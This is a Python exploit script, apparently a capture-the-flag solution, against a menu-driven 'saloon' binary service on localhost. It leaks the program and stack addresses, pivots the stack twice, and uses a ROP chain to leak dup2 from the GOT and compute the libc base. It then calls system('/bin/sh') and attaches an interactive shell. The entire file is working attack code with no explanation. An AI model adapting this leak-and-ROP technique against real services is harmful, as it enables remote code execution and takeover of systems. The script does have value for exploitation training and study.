#!/usr/bin/python

import socket
import struct
import telnetlib

s = socket.create_connection(('localhost', 1405))
f = s.makefile('rw', bufsize=0)

def readuntil(f, s):
    data = ''
    while s not in data:
        data += f.read(1)
    return data

def enter_referral(f, code):
    readuntil(f, 'Your choice: ')
    f.write('1\n')
    readuntil(f, 'Code (12 bytes): ')
    f.write(code)
    f.readline()

def request_invite(f, age, name, pwn=False):
    readuntil(f, 'Your choice: ')
    f.write('2')
    readuntil(f, 'Age: ')
    f.write(age)
    readuntil(f, 'Name: ')
    f.write(name)
    if pwn == False:
        return readuntil(f, 'There is no more room.\n')

def quit(f):
    readuntil(f, 'Your choice: ')
    f.write('3')

enter_referral(f, 'A')

saloon_leak = request_invite(f, 'A', 'A' * 8)[38:44].ljust(8, '\0')
saloon_base = struct.unpack('<Q', saloon_leak)[0] - 0x10f7
print 'saloon base address = 0x%x' % saloon_base

write_gadget = saloon_base + 0xf58
read_gadget = saloon_base + 0x106a
sub_rsp = saloon_base + 0x12dd
leave = saloon_base + 0x1380
pop_rbp_r14_r15 = saloon_base + 0x15cf
pop_rdi = saloon_base + 0x15d3
dup2_got = saloon_base + 0x201f18
second_pivot = saloon_base + 0x2020c0

enter_referral(f, 'A' * 16)

payload  = 'A' * 19
payload += struct.pack('<Q', sub_rsp)[:-2]
payload += 'A\0'

request_invite(f, payload, 'A' * 16, True)
request_invite(f, 'A', 'A' * 8)

stack_leak = request_invite(f, 'A', 'A' * 8)[38:44]
stack_leak = struct.unpack('<Q', stack_leak.ljust(8, '\0'))[0]
print 'leaked stack address = 0x%x' % stack_leak

first_pivot = stack_leak - 0x50
rop_buf = stack_leak - 0x60

request_invite(f, str(leave), 'A')

payload  = 'A' * 48
payload += struct.pack('<Q', second_pivot)

enter_referral(f, payload)

payload  = 'A' * 11
payload += struct.pack('<Q', first_pivot)[:-2]
payload += 'A\0AAAAA'
payload += struct.pack('<Q', pop_rbp_r14_r15)[:3]

request_invite(f, payload, 'A' * 16)

payload  = [
    struct.pack('<Q', rop_buf),
    struct.pack('<Q', pop_rdi),
    struct.pack('<Q', dup2_got),
    struct.pack('<Q', write_gadget),
    struct.pack('<Q', read_gadget)
]

enter_referral(f, payload[2] + payload[3])
request_invite(f, payload[4], payload[0] + payload[1])
quit(f)

dup2 = struct.unpack('<Q', f.read(6).ljust(8, '\0'))[0]
libc_base = dup2 - 0x1109a0
print 'libc base address = 0x%x' % libc_base

exit = libc_base + 0x43120
system = libc_base + 0x4f440
binsh = libc_base + 0x1b3e9a

readuntil(f, 'Code (12 bytes): ')

payload  = struct.pack('<Q', pop_rdi)
payload += struct.pack('<Q', binsh)
payload += struct.pack('<Q', system)
payload += struct.pack('<Q', exit)

f.write(payload)

t = telnetlib.Telnet()
t.sock = s
t.interact()
